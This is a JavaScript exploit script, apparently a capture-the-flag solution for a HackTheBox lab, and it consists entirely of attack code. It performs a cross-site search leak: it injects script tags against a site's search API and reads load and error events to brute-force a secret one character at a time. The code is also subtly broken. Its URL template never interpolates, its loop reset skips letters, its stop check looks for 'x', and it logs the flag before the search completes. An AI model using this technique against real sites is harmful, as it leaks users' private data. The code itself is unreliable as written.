var ip = '188.166.171.200:30840'; // HTB Server IP Address
var flag = 'Ba'; // init search word
var letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
var url = 'http://${ip}/api/entries/search?q=';
async function getLetter(ch){
  return new Promise((resolve, reject)=>{
    const script = document.createElement("script");
    script.src = url+encodeURIComponent(flag+ch);
    script.onload = () => ch==='}' ? reject(ch):resolve(ch);
    script.onerror = () => reject(ch);
    document.head.appendChild(script);
  });
}
async function getFullWord(letters) {
  var b = false; var ch;
  for(var i=0; i < letters.length; i++){
    await getLetter(letters[i]).then((res) => {flag=flag.concat(res); b = res==='x' ? true:false; i=0} , (res)=> { } );
    if(b) break;
  }
};
getFullWord(letters);
console.log(`Flag is ${flag}`);
